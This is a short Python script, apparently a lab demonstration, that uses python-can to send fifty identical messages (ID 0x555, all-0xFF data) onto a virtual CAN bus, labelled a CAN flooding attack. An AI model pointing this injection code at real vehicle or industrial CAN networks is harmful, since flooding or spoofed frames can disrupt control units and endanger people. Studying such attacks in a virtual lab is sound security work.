import can
import time


bus = can.Bus(
    interface="virtual",
    channel="CAN_Cybersecurity_Bus",
    receive_own_messages=True
)


print("===================================")
print("       CAN FLOODING ATTACK")
print("===================================")


attack_id = 0x555

attack_data = [255, 255, 255, 255, 255, 255, 255, 255]

message_count = 0


for i in range(50):

    message = can.Message(
        arbitration_id=attack_id,
        data=attack_data,
        is_extended_id=False
    )

    bus.send(message)

    message_count += 1

    print(
        "Attack Message:",
        message_count,
        "| ID:",
        hex(message.arbitration_id),
        "| Data:",
        list(message.data)
    )

    time.sleep(0.01)


print()
print("===================================")
print("CAN FLOODING ATTACK COMPLETE")
print("Attack Messages:", message_count)
print("Attack CAN ID:", hex(attack_id))
print("===================================")


bus.shutdown()